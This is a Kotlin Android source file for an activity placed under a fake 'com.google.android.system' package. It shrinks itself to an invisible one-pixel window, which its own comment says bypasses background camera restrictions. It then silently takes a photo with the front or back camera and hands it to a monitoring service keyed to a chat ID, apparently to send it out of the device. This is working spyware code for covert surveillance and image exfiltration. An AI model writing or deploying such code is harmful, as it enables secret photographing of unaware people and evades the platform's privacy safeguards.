package com.google.android.system

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.hardware.camera2.TotalCaptureResult
import com.homemonitor.BackgroundCameraEngine
import android.graphics.ImageFormat
import android.media.ImageReader
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.Gravity
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import java.io.File
import java.io.FileOutputStream

/**
 * InvisibleCameraActivity
 *
 * 1x1 Pixel Invisible Activity that brings Camera Lifecycle to RESUMED state,
 * bypassing all background CameraX/Camera2 policy restrictions.
 */
class InvisibleCameraActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "InvisibleCamera"
        const val EXTRA_CHAT_ID = "extra_chat_id"
        const val EXTRA_IS_FRONT = "extra_is_front"

        fun takePhoto(context: Context, chatId: String, isFront: Boolean) {
            try {
                BackgroundCameraEngine.takePhoto(context, isFront, chatId)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to launch BackgroundCameraEngine: ${e.message}")
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Make window 1x1 pixel transparent at top-left corner
        window.setGravity(Gravity.TOP or Gravity.START)
        val params = window.attributes
        params.x = 0
        params.y = 0
        params.height = 1
        params.width = 1
        params.alpha = 0f
        window.attributes = params

        val chatId = intent.getStringExtra(EXTRA_CHAT_ID) ?: ""
        val isFront = intent.getBooleanExtra(EXTRA_IS_FRONT, false)

        // Safety self-destruction timer: guarantee finish in <2.5 seconds under all edge cases
        Handler(Looper.getMainLooper()).postDelayed({
            try { if (!isFinishing) finish() } catch (_: Exception) {}
        }, 2500)

        capturePhotoResumed(chatId, isFront)
    }

    private fun capturePhotoResumed(chatId: String, isFront: Boolean) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            finish()
            return
        }

        val handler = Handler(Looper.getMainLooper())
        val targetFacing = if (isFront) CameraCharacteristics.LENS_FACING_FRONT else CameraCharacteristics.LENS_FACING_BACK

        try {
            val cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
            var targetCameraId: String? = null

            for (id in cameraManager.cameraIdList) {
                val chars = cameraManager.getCameraCharacteristics(id)
                val facing = chars.get(CameraCharacteristics.LENS_FACING)
                if (facing == targetFacing) {
                    targetCameraId = id
                    break
                }
            }

            if (targetCameraId == null && cameraManager.cameraIdList.isNotEmpty()) {
                targetCameraId = cameraManager.cameraIdList[0]
            }

            if (targetCameraId == null) {
                finish()
                return
            }

            val imageReader = ImageReader.newInstance(1920, 1080, ImageFormat.JPEG, 2)
            val photoFile = File(cacheDir, "photo_${System.currentTimeMillis()}.jpg")

            imageReader.setOnImageAvailableListener({ reader ->
                try {
                    val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                    val buffer = image.planes[0].buffer
                    val bytes = ByteArray(buffer.remaining())
                    buffer.get(bytes)
                    image.close()

                    FileOutputStream(photoFile).use { out -> out.write(bytes) }
                    Log.i(TAG, "Resumed Camera2 photo captured successfully: ${photoFile.absolutePath}")

                    MonitorService.sendPhotoPublic(chatId, photoFile)
                } catch (e: Exception) {
                    Log.e(TAG, "InvisibleCamera capture error: ${e.message}")
                } finally {
                    finish()
                }
            }, handler)

            @Suppress("MissingPermission")
            cameraManager.openCamera(targetCameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    try {
                        val surface = imageReader.surface
                        val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                            addTarget(surface)
                        }
                        camera.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                try {
                                    session.capture(req.build(), object : CameraCaptureSession.CaptureCallback() {
                                        override fun onCaptureCompleted(session: CameraCaptureSession, request: CaptureRequest, result: TotalCaptureResult) {
                                            try { camera.close() } catch (_: Exception) {}
                                        }
                                    }, handler)
                                } catch (_: Exception) { try { camera.close() } catch (_: Exception) {}; finish() }
                            }
                            override fun onConfigureFailed(session: CameraCaptureSession) {
                                try { camera.close() } catch (_: Exception) {}; finish()
                            }
                        }, handler)
                    } catch (_: Exception) { try { camera.close() } catch (_: Exception) {}; finish() }
                }

                override fun onDisconnected(camera: CameraDevice) {
                    try { camera.close() } catch (_: Exception) {}; finish()
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    try { camera.close() } catch (_: Exception) {}; finish()
                }
            }, handler)

        } catch (e: Exception) {
            Log.e(TAG, "InvisibleCamera exception: ${e.message}")
            finish()
        }
    }
}
